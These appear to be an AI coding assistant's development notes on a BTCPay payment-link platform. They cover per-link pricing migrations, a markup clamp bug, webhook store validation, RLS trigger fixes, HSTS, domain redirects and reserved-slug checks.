# Per-link pricing, and the deferred items, September 2026

## The per-link gap — caught by the owner's own question

Asked how existing data would behave after the upgrade — specifically
creators already promoted to moderator, and links already priced at 10%
and 0% — investigating it surfaced a real design mistake in 0059.

Pricing today is **per-link**: `payment_links.shop_id` points at a shop,
each shop is a separate BTCPay store with its own rate spread, so two
links owned by one person can charge different markups. 0059 put
`cost_percent` on the **profile**, which is per-user and cannot express
that at all.

Worse, the failure would have been silent and money-losing. The new
model requires the BTCPay store spread to be 0% — so a link that was
quietly relying on a 10% store spread would have started charging 10%
less, on every payment, with no error anywhere.

**0063 fixes both:** `payment_links.cost_percent` (nullable, falling
back to the owner's default via COALESCE), plus a backfill that copies
each link's current shop surcharge onto the link itself. Verified by
simulation that every existing link charges exactly the same amount
before and after, and that skipping the backfill would drop every 10%
link to 0%.

The question was better than the answer I would have given without it —
this was found by checking the data, not by reviewing the code again.

## Health check now covers every shop

Was `order by is_default desc ... limit 1` — a single ping. If shop #2
or #3 was down while the default was healthy, the check reported
"healthy" while every link routed to the broken shop failed. Now loops
every active shop, sequentially (a burst of parallel requests to a node
that is already struggling is the wrong move for a health check), and
reports per-shop latency or failure. Also catches a shop whose
`api_key_env` points at an unset secret, which previously produced a
confusing auth failure rather than a clear one.

## Webhook store-ownership validation — no longer deferred

This sat deferred across two rounds because the fix looked like it
needed a secret-index-to-shop mapping that does not cleanly exist.
Checking BTCPay's Greenfield spec showed that assumption was wrong:
every invoice webhook event carries `storeId` ("the store id of the
invoice's event"), and `payments.btcpay_store_id` already records which
store issued each invoice. The two can simply be compared — no mapping
needed.

`verifySignature()` accepts any of the configured webhook secrets,
because one BTCPay server hosts several stores and each generates its
own. That alone meant a leaked secret from store A could forge a
settlement for store B's invoice. Now a mismatch is rejected with 403
and alerted.

**Fails open when `storeId` is absent** rather than rejecting: an older
BTCPay omitting the field would otherwise have every settlement refused,
which is far worse than the narrow risk this closes. It logs instead, so
the gap is visible rather than silent.

## register.html

Last page still on the original violet-and-amber palette — a new user's
very first screen looked like a different product than the one they were
joining. Now matches the rest. Checked the other pages for leftovers
too: the `#F5A623` remaining in four of them is `--warn`, a deliberate
warning colour, not a leftover.

## Verified

63 migrations parse clean; 8 Edge Functions build; all 8 pages pass
structural checks; every `rpc()` call matches its SQL definition. All
three `DROP FUNCTION`s in 0063 verified to come before their `CREATE`
and to be followed by a re-grant — including `admin_list_payment_links`,
whose missing DROP was caught by the signature checker before shipping
(its return type gained two columns, so it would have failed 42P13 and
rolled back the migration, backfill included).

`docs/UPGRADING-EXISTING-DATA.md` covers the upgrade path for an
existing deployment: what happens to promoted moderators, what happens
to differently-priced links, the required order of operations, and a
verification query.

---

# A clamp that silently undid migration 0060

Found by an external review, verified directly, and correct. Nine audit
rounds and two prior external reviews (Manus, Grok) all missed it —
including my own, twice, while editing the very function it lives in.

`create-invoice` clamps the markup before applying it:

```ts
const costPercent = Number.isFinite(rawCost) ? Math.min(Math.max(rawCost, 0), 100) : 0;
```

That `100` was written alongside 0059, which had a 25% admin ceiling, so
a defensive bound of 100 was comfortably above anything reachable. Then
0060 deliberately removed the ceiling and widened the database CHECK to
0–1000, and 0063 applied the same bound to the new per-link column —
but this line was never updated.

**Effect:** any cost above 100% was silently clamped to 100%. No error,
no warning, no log. A link set to 300% charged as if it were 100%.

| Set | Intended | Actually charged | Lost |
|---|---|---|---|
| 50% | $150.00 | $150.00 | — |
| 100% | $200.00 | $200.00 | — |
| 150% | $250.00 | $200.00 | $50.00 |
| 300% | $400.00 | $200.00 | $200.00 |
| 1000% | $1100.00 | $200.00 | $900.00 |

It does not cost the platform anything — the withdrawal fee is a
separate calculation — but it silently disabled the owner's explicit
decision in exactly the range that decision was made for.

**Why it survived so long:** everything at or under 100% behaves
correctly, and every realistic test value sits there. The bug is
invisible unless someone deliberately tests above 100%, which nobody
did, because nobody expected a bound to exist.

**Fixed** by matching the line to the database's own constraint. No
migration needed — redeploy `create-invoice`.

**Swept for the same drift elsewhere.** Checked every numeric clamp in
all 8 Edge Functions: the remaining three (`daily-report`'s 1–90 day
range, `reconcile`'s 1–30, `og-image`'s font sizing) have no
corresponding database constraint to drift from. Checked the
client-side caps too — `admin.html`'s cost check already reads 0–1000
and its fee checks 0–100, both matching the database; `dashboard.html`
enforces only a lower bound and leaves the ceiling to the server, which
is correct.

**Lesson:** when a limit lives in two places, changing one is a silent
half-change. 0060 raised a ceiling in SQL and in `admin.html`, and
missed the Edge Function — the same shape as 0059's three copies of the
profit formula. Worth grepping every layer for the old number, not just
the files being edited.

## Also documented precisely: the compounding migration window

The upgrade guide said to "keep the gap short" between running the
migrations and setting the BTCPay store spread to 0%. That was vague
about a real effect, so it now carries the arithmetic:

```
$100 link, backfilled cost 10%, shop spread still 10%
  CPAY sends BTCPay  $110.00
  BTCPay adds its 10%   $121.00 charged to the payer
```

10% above what the same link charged the previous day. Brief, but it is
overcharging a customer, so the guide now says to complete the steps in
one sitting rather than leaving migrations applied overnight.

## Verified

`create-invoice` passes `tsc --strict` with zero errors; 63 migrations
parse clean; all 8 Edge Functions build; frontend checks pass.

---

# The deferred list, closed out

Every remaining item verified against the real code before acting.

## Fixed in migration 0064

Three gaps with the same shape: an RLS policy checking only WHO is
writing (`user_id = auth.uid()`), with no trigger checking WHAT.

**A creator could hide their own messages from the admin.**
`guard_message_updates()` said so in its own comment — *"Creators may
flip read/delete flags on any message in their thread"* — written before
0049 gave those flags meaning. 0049's design is that each side hides
only from its own view; the raw UPDATE policy let a creator set
`deleted_by_admin` directly, doing exactly what that design forbids.
`read_by_admin` had the same problem: mark your own unread message as
read by staff and it is buried. Both columns now refused from a browser
session; `deleted_by_creator` and `read_by_creator` stay writable,
because those are the creator's own view and `hide_message()` writes
through the same path.

**A creator could restore an admin-deleted link, and set any cost.**
`guard_link_shop_updates()` (0036) guards `shop_id` and `user_id`. Two
columns added later were not guarded at all: `deleted_at` (0052) —
clearing it un-deletes a link an admin removed — and `cost_percent`
(0063), whose 0–1000 bound lives in `set_link_cost_percent()` and was
skipped entirely by a direct UPDATE.

**`variant_group` let one creator hold unlimited links.**
`enforce_link_limit()` counts `distinct coalesce(variant_group, id)`,
which is correct — four style spellings of one name should count as one
link. But nothing checked who a `variant_group` belonged to, and the
INSERT policy says nothing about the column. Putting every link in one
hand-picked group meant the count saw a single group forever and the
limit never fired. Capped at four members, exactly what
`create_link_variants()` produces.

**`moderator` was never reserved.** Every other page name is on the
list; this one was missed when the moderator panel arrived in 0028.

## Also fixed

**Invoice ceiling.** A 900% markup on a $6,000 link is individually
within every rule and still produces a $60,000 invoice — beyond what a
Lightning channel is likely to carry, failing as an opaque BTCPay error.
Now refused at $50,000 with a message a payer can act on. Verified the
boundary: $5,000 at 900% passes at exactly $50,000; $50,000 at 1% does
not.

**HSTS.** Added `max-age=31536000; includeSubDomains`. Deliberately
**not** `preload` — that ships the domain into browsers' hard-coded list
and removal takes months; worth it only once every subdomain is
certainly HTTPS-only forever.

**Payment-only domains served the whole app.** The Worker redirected
only `path === ""`, so `/admin`, `/login`, `/dashboard`, `/register` and
`/moderator` all served happily from a payment host. Not an
authentication hole — those pages check the session and RLS does not care
which hostname asked — but the admin panel should not be discoverable on
a hostname handed to customers, and a login form on a payment domain is
the exact shape of a convincing phishing page. Only redirects when the
host is registered `purpose='payment'` and a site domain exists to point
at, so single-domain setups are unaffected.

**Reserved-slug drift, caught by a new CI check.** The list lives in
four places and had *already* drifted: the database and `404.html`
carried 18 entries, the Worker 11, `dashboard.html` 10. All four synced,
and `ci/check_frontend.py` now diffs the three copies against
`validate_link_slug()` — the only one that can actually refuse an
insert — so the next drift fails the build. The check found the real
drift on its first run, which is how it earned its place.

A mistake caught while adding it: the new function was first appended to
the end of `check_frontend.py`, *after* its `sys.exit()` — it would never
have run. Moved above the invocation block and rewritten to the module's
own conventions (`glob`, the shared `failures` list) rather than the
`pathlib` style it was drafted in.

## Not fixed, with the reason

**CDN pinning / SRI.** Subresource Integrity needs the real SHA-384 hash
of the exact file being pinned, and a wrong hash does not degrade — the
browser refuses the script and every page stops working. The sandbox
cannot reach jsDelivr, so any hash written here would be invented.
`docs/SETUP-REFERENCE.md` now carries the exact commands to compute the
hashes and the pinned `<script>` form to paste in, including the warning
that SRI on a floating `@2` URL breaks the moment a new v2 ships.

**A restore UI for soft-deleted links.** Not built; nobody asked for one.
0064 makes restoring an admin decision rather than something a creator
can do from a browser, which was the actual gap.

## Verified

64 migrations parse clean; 8 Edge Functions build; `create-invoice`
passes `tsc --strict` with zero errors; the Worker parses; all frontend
checks pass including the new reserved-slug diff; workflow and config
valid. All three functions redefined in 0064 signature-diffed as exact
matches — `guard_link_shop_updates` rewritten schema-qualified with
`set search_path to 'public'` and `$function$` quoting to match 0036's
exact form rather than risk a second function under a different
resolution.

---

# Pre-existing reserved slugs — a gap 0064 left open

A reviewer noticed that 0064 reserves `moderator` for the future but
never checks whether a link already holds it. Verified, and the
consequence is larger than a preview glitch.

`trg_validate_link_slug` fires `before insert or update OF slug`, so it
only ever inspects a slug being written. A row registered before this
migration is never re-validated.

The Worker checks RESERVED *before* deciding whether a path is a payment
slug:

```js
if (!looksLikeSlug || RESERVED.has(path.toLowerCase())) {
    return fetch(request);
}
```

So once `moderator` joins that list, `/moderator` serves
`moderator.html`. An existing `/moderator` payment link does not just
lose its link preview — it stops resolving as a payment link at all,
silently, for everyone the creator already gave that URL to.

**Added to 0064:** a `DO` block that scans for any live link holding any
reserved slug and raises a **WARNING** per row, naming the slug, the
owner and whether it is active.

Deliberately a warning rather than either alternative:

- an **exception** would abort the entire migration over one row
- an **automatic rename** would break exactly the URLs this is warning
  about, just without telling anyone

Which link to disable, and whether to tell its creator first, is a
person's decision. A WARNING shows prominently in the Supabase SQL
editor where a NOTICE can be scrolled past.

## Re-verified this round

- The $50,000 ceiling's boundary, independently: $5,000 at 899% →
  $49,950 passes; at 900% → exactly $50,000 passes; at 901% → $50,050
  rejected. The comparison is `>`, so the round number itself is allowed.
- All four reserved-slug lists now carry 19 entries with nothing missing
  from any copy, checked against `validate_link_slug()` as the
  authority.
- 64 migrations parse clean, 8 Edge Functions build, the Worker parses,
  frontend checks pass.
